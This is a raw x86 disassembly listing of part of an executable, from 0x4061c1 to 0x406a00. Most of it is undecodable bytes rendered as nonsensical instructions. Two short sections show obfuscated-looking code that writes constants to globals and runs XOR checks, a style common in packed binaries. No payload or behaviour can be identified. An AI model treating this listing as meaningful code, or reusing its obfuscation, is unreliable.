  4061c1:	ss mov cl,0x44
  4061c4:	loopne 0x40622f
  4061c6:	or     DWORD PTR [edx-0x7b0b4b47],esi
  4061cc:	outs   dx,BYTE PTR ds:[esi]
  4061cd:	test   eax,0x2dc3ffe4
  4061d2:	retf   0xfd72
  4061d5:	es jmp 0xde02d863
  4061db:	or     esi,DWORD PTR [ecx+0x74]
  4061de:	add    BYTE PTR [eax+0x48],cl
  4061e1:	jbe    0x40618e
  4061e3:	jnp    0x4061d4
  4061e5:	dec    edi
  4061e6:	mov    cl,0xb1
  4061e8:	jmp    0x3b81:0x1a3a1c32
  4061ef:	out    0xf2,al
  4061f1:	push   ebx
  4061f2:	popa   
  4061f3:	mov    cl,0x0
  4061f5:	retf   
  4061f6:	push   0xffffff8d
  4061f8:	daa    
  4061f9:	xchg   edx,eax
  4061fa:	aas    
  4061fb:	sbb    dh,BYTE PTR [edx+0x58280f2e]
  406201:	in     eax,0x87
  406203:	cmp    al,0x1c
  406205:	imul   ecx,DWORD PTR ds:0x696b12dc,0x7c7498
  40620f:	sbb    ebp,ebp
  406211:	sbb    BYTE PTR [eax+0x6c1778ef],cl
  406217:	(bad)  
  406219:	cmp    eax,0xb7c086b8
  40621e:	lods   eax,DWORD PTR ds:[esi]
  40621f:	xchg   BYTE PTR [ecx-0x5b7db82a],dl
  406225:	imul   eax,DWORD PTR [eax-0x11],0x5d
  406229:	inc    ecx
  40622a:	mov    dl,0xf9
  40622c:	xchg   DWORD PTR [esi+edi*2-0x26],eax
  406230:	gs pop ecx
  406232:	mov    eax,DWORD PTR [edi]
  406234:	bound  edx,QWORD PTR [ebx+ebp*4+0x32]
  406238:	mov    DWORD PTR [ebx],ecx
  40623a:	mov    DWORD PTR [edi+0x65214f3],eax
  406240:	(bad)  
  406241:	js     0x4061f0
  406243:	pop    edx
  406244:	push   ecx
  406245:	dec    eax
  406246:	mov    ch,0x97
  406248:	xchg   ebx,eax
  406249:	adc    DWORD PTR [edx],ebp
  40624b:	push   ebx
  40624c:	sub    eax,0xaac5d475
  406251:	mov    ds:0x641e74f6,eax
  406256:	jns    0x406245
  406258:	test   al,0x2d
  40625a:	or     DWORD PTR ds:0x2df1de61,0xb19f59c8
  406264:	xchg   ebp,eax
  406265:	xchg   ebx,eax
  406266:	xchg   edi,eax
  406267:	mov    eax,ds:0x52861c9d
  40626c:	cmp    al,0x66
  40626e:	cmp    cl,dl
  406270:	jmp    0x4062d7
  406272:	nop
  406273:	sbb    BYTE PTR [edx*8-0x29488a37],dh
  40627a:	pop    ss
  40627b:	mov    al,BYTE PTR [ecx+0x79b2113d]
  406281:	lahf   
  406282:	fidivr DWORD PTR [eax]
  406284:	fucomip st,st(6)
  406286:	mov    cl,0xe2
  406288:	rcr    BYTE PTR [esi+ebx*2+0x546124da],cl
  40628f:	fcomp  QWORD PTR [edx-0x18abfa03]
  406295:	adc    eax,0xb099027e
  40629a:	call   0xb483d852
  40629f:	int    0x7f
  4062a1:	push   esp
  4062a2:	pusha  
  4062a3:	fistp  WORD PTR ds:0x51800cc
  4062a9:	push   ss
  4062aa:	scas   al,BYTE PTR es:[edi]
  4062ab:	rcr    BYTE PTR [eax-0x7c],cl
  4062ae:	test   eax,0x9e2c38a
  4062b3:	sbb    al,0x4f
  4062b5:	shl    BYTE PTR [ecx-0x52],0xd5
  4062b9:	rol    DWORD PTR [ebx+0x3c8c5263],cl
  4062bf:	xor    al,0x5d
  4062c1:	add    bl,BYTE PTR [edx]
  4062c3:	outs   dx,BYTE PTR ds:[esi]
  4062c4:	scas   al,BYTE PTR es:[edi]
  4062c5:	push   esi
  4062c6:	sti    
  4062c7:	nop
  4062c8:	ja     0x406345
  4062ca:	mov    esp,DWORD PTR es:[eax]
  4062cd:	or     al,0x29
  4062cf:	pop    es
  4062d0:	dec    eax
  4062d1:	adc    al,0x85
  4062d3:	pop    ebp
  4062d4:	jl     0x4062f7
  4062d6:	mov    ecx,esi
  4062d8:	cld    
  4062d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062da:	outs   dx,BYTE PTR ds:[esi]
  4062db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062dd:	push   ss
  4062de:	xor    cl,dh
  4062e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062e1:	call   0x2a22:0x4a81dbd0
  4062e8:	rcl    ebx,1
  4062ea:	cmp    DWORD PTR [esp+eiz*8+0x51e083d],ebp
  4062f1:	or     BYTE PTR [edx+0x30],0x95
  4062f5:	outs   dx,BYTE PTR ds:[esi]
  4062f6:	mov    ebx,0xa81deb59
  4062fb:	add    ebp,DWORD PTR [ebx+eax*2-0x10c0126e]
  406302:	adc    DWORD PTR [edx+0x55c0121],ebx
  406308:	jnp    0x406320
  40630a:	push   ecx
  40630b:	ss loopne 0x4062a9
  40630e:	xor    ebx,ebx
  406310:	test   BYTE PTR [ecx-0x12727d1f],bh
  406316:	imul   ecx,DWORD PTR [ebx-0x8],0xd04ce064
  40631d:	fs repz cmp eax,0xffcd64e4
  406324:	in     al,dx
  406325:	fstcw  WORD PTR [eax+ebx*4]
  406329:	(bad)  
  40632a:	fcmovne st,st(6)
  40632c:	jns    0x406332
  40632e:	pop    ecx
  40632f:	scas   eax,DWORD PTR es:[edi]
  406330:	pop    es
  406331:	or     bl,BYTE PTR [ecx-0x13254560]
  406337:	dec    ebp
  406338:	add    al,0xd0
  40633a:	hlt    
  40633b:	pop    ss
  40633c:	push   esp
  40633d:	in     al,dx
  40633e:	das    
  40633f:	ss jno 0x406361
  406342:	sub    BYTE PTR [ebp+0x2a],dh
  406345:	jle    0x4062da
  406347:	ret    
  406348:	sbb    BYTE PTR [esi+ebx*1],bh
  40634b:	inc    eax
  40634c:	mov    cl,0x31
  40634e:	loope  0x406340
  406350:	retf   
  406351:	push   edi
  406352:	add    eax,0xfaafe4d5
  406357:	and    eax,0x1ff62b41
  40635c:	int    0x16
  40635e:	scas   al,BYTE PTR es:[edi]
  40635f:	loope  0x40635c
  406361:	fstp   QWORD PTR [esi]
  406363:	enter  0x10c3,0xd0
  406367:	fwait
  406368:	xchg   edi,eax
  406369:	in     al,dx
  40636a:	xchg   ebx,eax
  40636b:	dec    edi
  40636c:	pop    es
  40636d:	push   ds
  40636e:	cmp    esp,edx
  406370:	in     al,dx
  406371:	or     BYTE PTR ds:0x29cd1031,cl
  406377:	enter  0x1e20,0x9b
  40637b:	hlt    
  40637c:	inc    ebp
  40637d:	test   DWORD PTR [ebp+0x83d7193],edi
  406383:	dec    esi
  406384:	in     al,0x15
  406386:	mov    ebx,0x5b015bb1
  40638b:	mov    ds:0x340e39c6,al
  406390:	icebp  
  406391:	div    WORD PTR [ebx+0x57]
  406395:	cdq    
  406396:	xchg   DWORD PTR [edi-0x1e8e6fb3],ebp
  40639c:	mov    al,ds:0x263910ff
  4063a1:	adc    BYTE PTR [ecx+0x78],dl
  4063a4:	adc    al,0xae
  4063a6:	adc    edi,edi
  4063a8:	mov    ebx,0x3cfa9fdd
  4063ad:	jae    0x40639f
  4063af:	mov    ds:0x48eeff87,al
  4063b4:	sbb    DWORD PTR [edx+0x44],edi
  4063b7:	pushf  
  4063b8:	outs   dx,BYTE PTR ds:[esi]
  4063b9:	daa    
  4063ba:	pusha  
  4063bb:	push   si
  4063bd:	ror    DWORD PTR [edx-0x586eca35],cl
  4063c3:	jnp    0x406370
  4063c5:	scas   eax,DWORD PTR es:[edi]
  4063c6:	push   es
  4063c7:	retf   
  4063c8:	popf   
  4063c9:	mov    bh,0x14
  4063cb:	popa   
  4063cc:	xor    ebx,DWORD PTR [edi-0x13]
  4063cf:	xor    BYTE PTR [edx+0x23],al
  4063d2:	cdq    
  4063d3:	inc    esp
  4063d4:	dec    ebp
  4063d5:	jecxz  0x406401
  4063d7:	ds mov ch,ch
  4063da:	mov    dh,0xc7
  4063dc:	lds    esi,FWORD PTR [ebp+0x236da3d5]
  4063e2:	call   0x5d62:0xcb8e07c9
  4063e9:	inc    ebp
  4063ea:	or     eax,0xc315f0c3
  4063ef:	into   
  4063f0:	jno    0x406410
  4063f2:	dec    edx
  4063f3:	in     al,dx
  4063f4:	test   DWORD PTR [ebp+0x1fec0089],esi
  4063fa:	repnz pop eax
  4063fc:	sti    
  4063fd:	stos   BYTE PTR es:[edi],al
  4063fe:	and    BYTE PTR [edx-0x44],dh
  406401:	repnz pop ds
  406403:	push   ecx
  406404:	cli    
  406405:	das    
  406406:	mov    esi,0x557a42e8
  40640b:	into   
  40640c:	and    BYTE PTR [edx+0x662854a6],bl
  406412:	fisub  WORD PTR [ebx+0x8]
  406415:	and    ch,BYTE PTR [esi-0x2259b480]
  40641b:	fcomip st,st(4)
  40641d:	fninit 
  40641f:	jmp    0xfff7:0xff860f66
  406426:	call   FWORD PTR [ebx-0x48]
  406429:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40642f:	leave  
  406430:	ret    0xc
  406433:	push   ebp
  406434:	mov    ebp,esp
  406436:	mov    eax,ds:0x41222c
  40643b:	add    DWORD PTR ds:0x430506,edi
  406441:	mov    edx,0x32729d
  406446:	xor    ecx,DWORD PTR ds:0x42e7e2
  40644c:	sub    eax,edx
  40644e:	inc    DWORD PTR ds:0x430512
  406454:	mov    ecx,0x7510856
  406459:	push   esi
  40645a:	sbb    DWORD PTR ds:0x430532,0x57eb
  406464:	mov    esi,DWORD PTR [ebp+0xc]
  406467:	xor    eax,ecx
  406469:	mov    DWORD PTR ds:0x42ee8c,0x533d
  406473:	cmp    eax,esi
  406475:	mov    DWORD PTR ds:0x42e7e2,0x3465
  40647f:	je     0x406fac
  406485:	mov    eax,ds:0x412224
  40648a:	dec    DWORD PTR ds:0x42e7da
  406490:	jmp    0x40681a
  406495:	fcmovnb st,st(7)
  406497:	dec    esi
  406498:	fild   WORD PTR [edx+0x57]
  40649b:	jnp    0x406498
  40649d:	(bad)  
  40649e:	cmp    ebx,DWORD PTR [esi*8-0x4b537aa2]
  4064a5:	fidiv  WORD PTR [ebx]
  4064a7:	jle    0x406527
  4064a9:	jmp    0x40651c
  4064ab:	jle    0x40652b
  4064ad:	dec    eax
  4064ae:	xchg   edi,eax
  4064af:	nop
  4064b0:	mov    WORD PTR [ebp+0x23],?
  4064b3:	sub    eax,0x582fc0cb
  4064b8:	mov    ah,0x21
  4064ba:	xchg   esi,eax
  4064bb:	xchg   edx,eax
  4064bc:	lea    ebp,[ebp+0x59]
  4064bf:	jns    0x406531
  4064c1:	add    BYTE PTR ds:0xa13e8ca7,dh
  4064c7:	arpl   WORD PTR [eax+0x5a],bx
  4064ca:	(bad)  
  4064cb:	mov    edi,0xd025b957
  4064d0:	hlt    
  4064d1:	retf   0x8d56
  4064d4:	sbb    al,0x8d
  4064d6:	jmp    0x4064b1
  4064d8:	mov    al,ds:0x5327d3f8
  4064dd:	xchg   ecx,eax
  4064de:	add    ecx,esi
  4064e0:	pop    ecx
  4064e1:	ins    DWORD PTR es:[edi],dx
  4064e2:	lock mov ch,0x45
  4064e5:	dec    esi
  4064e6:	pop    ds
  4064e7:	int    0xb0
  4064e9:	or     DWORD PTR [esi-0x6c8a11d9],ebx
  4064ef:	lock mov ds:0x52568a46,al
  4064f5:	mov    esi,0x451bd2b1
  4064fa:	aad    0xff
  4064fc:	rcr    DWORD PTR [ebx],0xc7
  4064ff:	add    eax,0xfd15e4a3
  406504:	push   edi
  406505:	scas   al,BYTE PTR es:[edi]
  406506:	aaa    
  406507:	lds    ebp,FWORD PTR [edx]
  406509:	mov    ebp,0x5f356665
  40650e:	js     0x40654f
  406510:	aam    0xa4
  406512:	stos   DWORD PTR es:[edi],eax
  406513:	push   DWORD PTR [edi+edx*2+0x66b45ec4]
  40651a:	(bad)  
  40651c:	shr    DWORD PTR [esp+ebp*4+0x1c],0xeb
  406521:	add    ch,bl
  406523:	mov    esp,0x9cce5606
  406528:	add    eax,edx
  40652a:	inc    esp
  40652b:	js     0x40651f
  40652d:	xchg   ax,ax
  40652f:	imul   eax,DWORD PTR [edi],0xffffffc8
  406532:	adc    esp,DWORD PTR [eax]
  406534:	loope  0x406589
  406536:	add    BYTE PTR [ecx],cl
  406538:	sbb    DWORD PTR [edx+0x53dea083],edi
  40653e:	les    ecx,FWORD PTR [esp+ecx*4]
  406541:	out    0x73,al
  406543:	jmp    0x65b818c0
  406548:	jmp    0x8e392f38
  40654d:	pop    ss
  40654e:	jae    0x406543
  406550:	or     al,0x23
  406552:	fisttp DWORD PTR [ecx+ebp*8]
  406555:	jne    0x406550
  406557:	pop    es
  406558:	xchg   edx,eax
  406559:	mov    dl,0xfb
  40655b:	dec    edx
  40655c:	loope  0x40653f
  40655e:	jg     0x406534
  406560:	cmp    dh,ch
  406562:	pop    ecx
  406563:	arpl   WORD PTR [esi-0x5fd1940a],bp
  406569:	lea    ebp,[ecx-0x26]
  40656c:	mov    edx,0x15cbdf97
  406571:	adc    eax,0xde1f8beb
  406576:	ror    DWORD PTR [edx],cl
  406578:	xchg   BYTE PTR [eax],ch
  40657a:	dec    ebp
  40657b:	out    0x97,eax
  40657d:	icebp  
  40657e:	lea    esi,[ebx+edi*1]
  406581:	mov    eax,0xd55e9d41
  406586:	mov    dh,0x4f
  406588:	mov    al,ds:0x40d3b8f3
  40658d:	sti    
  40658e:	(bad)  
  40658f:	and    ch,BYTE PTR [esi-0x4a]
  406592:	add    BYTE PTR [ebx],0x13
  406595:	adc    eax,0xe1e7cff1
  40659a:	or     DWORD PTR [ebx],esp
  40659c:	pop    edx
  40659d:	push   ss
  40659e:	dec    esp
  40659f:	sub    ah,BYTE PTR [ebx]
  4065a1:	add    BYTE PTR [ecx],ah
  4065a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065a4:	out    dx,al
  4065a5:	mov    ah,0x4f
  4065a7:	addr16 or edi,0xffffffbf
  4065ab:	cmp    BYTE PTR [ebp+0x685561f5],dh
  4065b1:	loop   0x406600
  4065b3:	and    eax,0x92ef11a6
  4065b8:	pop    edi
  4065b9:	test   BYTE PTR [ebx],dh
  4065bb:	xor    DWORD PTR [ebx+0x17bd94ac],ebp
  4065c1:	xchg   edx,eax
  4065c2:	push   esi
  4065c3:	into   
  4065c4:	inc    esi
  4065c5:	xor    eax,0x3ce92364
  4065ca:	mov    bh,BYTE PTR [edx+0x3b]
  4065cd:	and    ah,dl
  4065cf:	adc    eax,0x14b09b62
  4065d4:	mov    fs,WORD PTR [ebx+edi*8]
  4065d7:	imul   eax,DWORD PTR ds:0xf4f67136,0x56
  4065de:	aad    0xe7
  4065e0:	xchg   DWORD PTR [eax+0x4d],eax
  4065e3:	call   0xa9ef837d
  4065e8:	ret    0xf920
  4065eb:	mov    ecx,0x66225689
  4065f0:	add    ecx,DWORD PTR [edx-0x18]
  4065f3:	jbe    0x406663
  4065f5:	out    0x88,al
  4065f7:	pop    ebp
  4065f8:	iret   
  4065f9:	adc    ch,BYTE PTR [edx]
  4065fb:	ror    ebx,0xde
  4065fe:	cmp    al,BYTE PTR [eax+eax*2-0x19]
  406602:	xchg   edx,eax
  406603:	ds pop edx
  406605:	cmp    eax,0x6f9b7f25
  40660a:	cld    
  40660b:	push   edx
  40660c:	pop    esi
  40660d:	jnp    0x4065e6
  40660f:	jns    0x406645
  406611:	mov    esp,0xf4244e1e
  406616:	xchg   BYTE PTR [esp+edx*1],al
  406619:	push   ecx
  40661a:	inc    ecx
  40661b:	push   0x3ecdca62
  406620:	inc    esi
  406621:	fidivr DWORD PTR [ebp+ecx*4-0x281d782]
  406628:	fiadd  WORD PTR [esi]
  40662a:	pop    eax
  40662b:	mov    cl,0x5e
  40662d:	cmp    ch,BYTE PTR [ebx]
  40662f:	mov    edi,0xc8fb0261
  406634:	push   edx
  406635:	dec    ebp
  406636:	idiv   DWORD PTR [ebx+0x321bf0c4]
  40663c:	pop    ecx
  40663d:	imul   esi,DWORD PTR [esi-0x3cadda85],0xcf53f2ee
  406647:	push   0xa5ab7cbd
  40664c:	fisttp WORD PTR [ebp+esi*4-0x4a]
  406650:	imul   ecx,DWORD PTR [esi-0x7ea5c142],0xea72d57
  40665a:	pop    ecx
  40665b:	pushf  
  40665c:	imul   eax,DWORD PTR ds:0x678b2b6a,0x20
  406663:	inc    ebx
  406664:	push   ds
  406665:	lea    ecx,[esi]
  406667:	pop    ecx
  406668:	cmp    al,0x26
  40666a:	jle    0x4066aa
  40666c:	bnd jg 0x406603
  40666f:	ja     0x40660a
  406671:	jge    0x4066a6
  406673:	cmp    edi,DWORD PTR [eax]
  406675:	and    ecx,DWORD PTR [ebx]
  406677:	cmp    eax,0x8682df38
  40667c:	xchg   dx,ax
  40667e:	aaa    
  40667f:	retf   
  406680:	call   0x586d56a9
  406685:	ds fs (bad) 
  406688:	test   eax,0x499c2255
  40668d:	pop    eax
  40668e:	addr16 mov ds:0x46c2,eax
  406692:	add    DWORD PTR [ebp-0x7c4c7df3],0x3f
  406699:	test   BYTE PTR [edi+0x14],0xae
  40669d:	dec    esi
  40669e:	test   DWORD PTR [esi],ecx
  4066a0:	adc    BYTE PTR [ecx+0x5e6a73e3],0xbc
  4066a7:	fnstenv [edi+0x1fd77f2a]
  4066ad:	cli    
  4066ae:	pop    eax
  4066af:	dec    esi
  4066b0:	and    DWORD PTR [ecx-0x3f0521ca],ebp
  4066b6:	xlat   BYTE PTR ds:[ebx]
  4066b7:	or     DWORD PTR [eax+0xdd549b1],ecx
  4066bd:	stos   BYTE PTR es:[edi],al
  4066be:	ret    0x18a5
  4066c1:	aad    0x9f
  4066c3:	shr    DWORD PTR [esi-0x4c],0x31
  4066c7:	jo     0x4066fe
  4066c9:	jp     0x406725
  4066cb:	gs mov edi,0x16e2ffa0
  4066d1:	retf   0x36b5
  4066d4:	push   eax
  4066d5:	sub    edx,ecx
  4066d7:	xchg   esi,eax
  4066d8:	pop    esi
  4066d9:	fadd   DWORD PTR [ebx+0x2377ead2]
  4066df:	xchg   edi,eax
  4066e0:	arpl   ax,di
  4066e2:	aas    
  4066e3:	jp     0x40669c
  4066e5:	popa   
  4066e6:	ss sub al,0x45
  4066e9:	adc    BYTE PTR [esi-0x3e],0xac
  4066ed:	and    eax,0x72b6467f
  4066f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066f3:	nop
  4066f4:	mov    esp,edi
  4066f6:	mov    esi,0xdbf9ceee
  4066fb:	adc    eax,0xe6be8481
  406700:	ficomp DWORD PTR [edi-0x2]
  406703:	mov    bh,0xf
  406705:	xchg   ecx,eax
  406706:	stc    
  406707:	call   0x1d72:0x4ef0a7c0
  40670e:	fmul   QWORD PTR [ebx+0x1f74ecbf]
  406714:	fisttp WORD PTR [esi+ebp*2-0x1c]
  406718:	push   edx
  406719:	lods   eax,DWORD PTR ds:[esi]
  40671a:	rcr    DWORD PTR [edx-0x4aea7d2a],0x5a
  406721:	mov    dl,0xe2
  406723:	adc    al,BYTE PTR [ecx+0xa]
  406726:	pusha  
  406727:	stos   BYTE PTR es:[edi],al
  406728:	xchg   edi,eax
  406729:	push   cs
  40672a:	lock dec edx
  40672c:	mov    cl,0x88
  40672e:	push   ds
  40672f:	or     eax,0xa412e110
  406734:	jnp    0x40671b
  406736:	dec    ebx
  406737:	mov    BYTE PTR [ebx],ch
  406739:	or     al,0x68
  40673b:	pop    edi
  40673c:	lods   eax,DWORD PTR ds:[esi]
  40673d:	pop    edi
  40673e:	lea    edx,[edx]
  406740:	(bad)  
  406741:	pop    edx
  406742:	cli    
  406743:	or     BYTE PTR [ecx+0x125d6bfc],cl
  406749:	retf   0x5f54
  40674c:	cmp    eax,0xf01bbf11
  406751:	pop    ecx
  406752:	sbb    eax,0x74eca240
  406757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406758:	mov    DWORD PTR [esi],esp
  40675a:	je     0x40673a
  40675c:	mov    WORD PTR [edi+0x4a7cb2ee],ds
  406762:	or     eax,0x16c8ee01
  406767:	stc    
  406768:	stos   BYTE PTR es:[edi],al
  406769:	sub    al,0xd7
  40676b:	repnz push ecx
  40676d:	mov    ecx,DWORD PTR [edx]
  40676f:	jge    0x406796
  406771:	gs iret 
  406773:	dec    esp
  406774:	(bad)  
  406775:	jp     0x4067bd
  406777:	mov    ds:0x5811db08,al
  40677c:	xchg   ebp,eax
  40677d:	mov    ah,0x73
  40677f:	xlat   BYTE PTR ds:[ebx]
  406780:	xor    cl,BYTE PTR [edi-0x27dc9426]
  406786:	fdivr  DWORD PTR [edx+0x651e1bf5]
  40678c:	in     al,dx
  40678d:	ret    0xa601
  406790:	fwait
  406791:	mov    bh,0x8d
  406793:	mul    ebx
  406795:	pop    edx
  406796:	out    dx,eax
  406797:	(bad)  
  406798:	and    DWORD PTR [edx],esp
  40679a:	mov    WORD PTR [edx-0x60ba9b79],cs
  4067a0:	add    dh,0x17
  4067a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067a4:	retf   
  4067a5:	and    al,cl
  4067a7:	retf   0xa0db
  4067aa:	push   esp
  4067ab:	ss pop esi
  4067ad:	push   es
  4067ae:	add    al,0x1c
  4067b0:	ja     0x406757
  4067b2:	test   al,0xa0
  4067b4:	call   0xb87fced0
  4067b9:	mov    BYTE PTR [ecx],cl
  4067bb:	mov    bl,0x36
  4067bd:	ins    BYTE PTR es:[edi],dx
  4067be:	(bad)  [ebp+0x37]
  4067c1:	jb     0x406779
  4067c3:	outs   dx,BYTE PTR ds:[esi]
  4067c4:	aad    0x21
  4067c6:	mov    ecx,edx
  4067c8:	pop    esi
  4067c9:	(bad)  
  4067ca:	addr16 or eax,edi
  4067cd:	jb     0x40682f
  4067cf:	sbb    al,0xb0
  4067d1:	jae    0x406832
  4067d3:	in     eax,dx
  4067d4:	ja     0x406802
  4067d6:	test   eax,0x23843eea
  4067db:	dec    esi
  4067dc:	dec    esi
  4067dd:	into   
  4067de:	test   eax,0x523e0472
  4067e3:	and    DWORD PTR [edi],esi
  4067e5:	jae    0x4067b0
  4067e7:	out    0xb,al
  4067e9:	fist   DWORD PTR [ecx+0x5e1c7057]
  4067ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067f0:	ficomp DWORD PTR [ecx-0x3de6cc0]
  4067f6:	jnp    0x406796
  4067f8:	xchg   esp,eax
  4067f9:	lds    ebp,FWORD PTR [edi+ebx*8]
  4067fc:	mov    ah,0xb
  4067fe:	push   ds
  4067ff:	ss in  eax,dx
  406801:	(bad)  
  406802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406803:	data16 cli 
  406805:	lahf   
  406806:	mov    eax,ds:0x434ea82a
  40680b:	mov    cl,0x29
  40680d:	outs   dx,DWORD PTR ds:[esi]
  40680e:	aam    0xc7
  406810:	xchg   DWORD PTR [ebx-0x6e3b1b21],eax
  406816:	test   DWORD PTR [esi-0x5a],esp
  406819:	mov    BYTE PTR [ebx+0x1d810c75],cl
  40681f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406820:	out    dx,al
  406821:	inc    edx
  406822:	add    BYTE PTR [edx],ch
  406824:	add    eax,0xc22b0043
  406829:	xor    eax,ecx
  40682b:	mov    DWORD PTR ds:0x4305d2,0x4727
  406835:	cmp    eax,esi
  406837:	mov    DWORD PTR ds:0x42ee9c,0x846
  406841:	jne    0x406867
  406847:	add    eax,DWORD PTR ds:0x4305be
  40684d:	mov    eax,ds:0x41222c
  406852:	add    eax,DWORD PTR ds:0x412224
  406858:	mov    DWORD PTR ds:0x43053a,0x6a19
  406862:	jmp    0x406878
  406867:	mov    eax,DWORD PTR [ebp+0xc]
  40686a:	xor    DWORD PTR ds:0x4305d6,0x43051a
  406874:	xor    eax,ecx
  406876:	add    eax,edx
  406878:	mov    DWORD PTR ds:0x42eea4,0x1bc3
  406882:	jmp    0x406c0c
  406887:	xchg   BYTE PTR [ecx],dh
  406889:	fcmove st,st(5)
  40688b:	pop    ebp
  40688c:	fstp   QWORD PTR [ecx-0x3833e0bb]
  406892:	dec    esi
  406893:	or     ch,bl
  406895:	pop    ss
  406896:	add    DWORD PTR [ebx+0x36],ecx
  406899:	jle    0x406919
  40689b:	jmp    0x40690e
  40689d:	jle    0x40691d
  40689f:	pop    esi
  4068a0:	les    esp,FWORD PTR [esi]
  4068a2:	retf   0xe68f
  4068a5:	in     eax,0x9
  4068a7:	mov    al,ds:0x4f1e8430
  4068ac:	dec    esp
  4068ad:	cld    
  4068ae:	jbe    0x406833
  4068b0:	add    eax,0x88792856
  4068b5:	pusha  
  4068b6:	dec    esi
  4068b7:	retf   0x23e7
  4068ba:	(bad)  
  4068bb:	addr16 rol esi,1
  4068be:	in     eax,0x8e
  4068c0:	test   ebp,esp
  4068c2:	cmp    eax,0x3e835a9b
  4068c7:	mov    edx,0x91ffcd48
  4068cc:	iret   
  4068cd:	in     al,dx
  4068ce:	int3   
  4068cf:	pop    edi
  4068d0:	(bad)  
  4068d1:	adc    ebp,DWORD PTR [eax+0x1]
  4068d4:	imul   edx,DWORD PTR [ebp+0x22f85ec7],0xffffffe1
  4068db:	shr    DWORD PTR [ebx+0x404bc56a],0x73
  4068e2:	jnp    0x40687c
  4068e4:	push   edi
  4068e5:	push   0x44
  4068e7:	sbb    DWORD PTR [eax+0x59ce6517],eax
  4068ed:	xchg   ecx,eax
  4068ee:	push   0x9ee66f16
  4068f3:	sub    esi,edx
  4068f5:	jg     0x406890
  4068f7:	adc    dl,bh
  4068f9:	test   al,0xb2
  4068fb:	in     eax,0xd
  4068fd:	in     eax,dx
  4068fe:	mov    al,ds:0xa88f4a9e
  406903:	fnstcw WORD PTR [ecx]
  406905:	jb     0x4068f3
  406907:	sub    BYTE PTR [esi+ecx*4-0x357b4ca6],al
  40690e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40690f:	push   es
  406910:	lods   al,BYTE PTR ds:[esi]
  406911:	pop    ss
  406912:	loop   0x4068ef
  406914:	loopne 0x406929
  406916:	stos   BYTE PTR es:[edi],al
  406917:	mov    al,ds:0x4718d192
  40691c:	test   BYTE PTR [ecx],dh
  40691e:	sbb    DWORD PTR [ebx],esi
  406920:	stos   BYTE PTR es:[edi],al
  406921:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406922:	cmp    edi,DWORD PTR [ecx+0x771e71e0]
  406928:	sbb    al,0xd1
  40692a:	dec    edx
  40692b:	push   ebp
  40692c:	sti    
  40692d:	mov    al,BYTE PTR [ebp-0x6a5e008b]
  406933:	jae    0x40695c
  406935:	push   eax
  406936:	arpl   di,bx
  406938:	pusha  
  406939:	mov    dl,BYTE PTR [esp+esi*2-0x37258728]
  406940:	retf   
  406941:	out    dx,eax
  406942:	popf   
  406943:	and    edx,DWORD PTR [ecx-0x7c7763f8]
  406949:	hlt    
  40694a:	push   ebx
  40694b:	pop    ebx
  40694c:	mov    ebp,0x3f4bced5
  406951:	frstor [ebx-0x55]
  406954:	cmp    BYTE PTR [edx-0x6c],al
  406957:	scas   al,BYTE PTR es:[edi]
  406958:	jns    0x406913
  40695a:	je     0x406958
  40695c:	jnp    0x4068e0
  40695e:	das    
  40695f:	imul   esi,ecx,0xf
  406962:	ins    DWORD PTR es:[edi],dx
  406963:	dec    esp
  406964:	jae    0x4068f7
  406966:	dec    ebp
  406967:	mov    ch,0xc9
  406969:	stos   DWORD PTR es:[edi],eax
  40696a:	inc    DWORD PTR [ebx]
  40696c:	jne    0x40699c
  40696e:	pushf  
  40696f:	or     bh,BYTE PTR [edi-0x297e288]
  406975:	rcl    DWORD PTR [edi],cl
  406977:	push   edi
  406978:	jecxz  0x406965
  40697a:	push   ecx
  40697b:	jmp    0xf3e5:0x717dd4b9
  406982:	cmp    al,0x6f
  406984:	daa    
  406985:	(bad)  
  406986:	xchg   esp,eax
  406987:	xor    DWORD PTR [edi],esi
  406989:	ret    
  40698a:	sub    al,0xee
  40698c:	adc    edx,edx
  40698e:	mov    ecx,0xae109dfc
  406993:	jae    0x40698b
  406995:	loopne 0x4069bb
  406997:	sub    eax,0xe98bb1d5
  40699c:	mov    ds:0x51f5e4f1,eax
  4069a1:	cmc    
  4069a2:	adc    al,0x57
  4069a4:	std    
  4069a5:	dec    edx
  4069a6:	inc    esi
  4069a7:	fiadd  WORD PTR [ecx+0x6d]
  4069aa:	sub    bh,ah
  4069ac:	rcl    DWORD PTR [edx-0x54fa1ecb],1
  4069b2:	les    eax,FWORD PTR [edi+0x7]
  4069b5:	mov    BYTE PTR [edi-0x5d6ea18e],bh
  4069bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069bc:	fsubr  QWORD PTR [eax-0x12]
  4069bf:	jnp    0x4069e6
  4069c1:	xor    eax,0xd1e27ffb
  4069c6:	aam    0x33
  4069c8:	ror    BYTE PTR [ebx+eax*1],0x58
  4069cc:	add    bh,dl
  4069ce:	adc    al,0xe0
  4069d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069d1:	retf   
  4069d2:	push   0xb751c03
  4069d7:	push   DWORD PTR [ecx]
  4069d9:	(bad)  
  4069da:	leave  
  4069db:	jnp    0x406971
  4069dd:	xchg   ebp,eax
  4069de:	std    
  4069df:	add    eax,0xe82939e4
  4069e4:	sub    ah,dl
  4069e6:	stc    
  4069e7:	push   ss
  4069e8:	bound  esp,QWORD PTR [edi]
  4069ea:	sub    eax,0x5c32fc14
  4069ef:	jno    0x406a69
  4069f1:	push   ebx
  4069f2:	mov    ecx,0xefc310d1
  4069f7:	lods   eax,DWORD PTR ds:[esi]
  4069f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069f9:	jmp    0x16ed:0x62e3c930
  406a00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
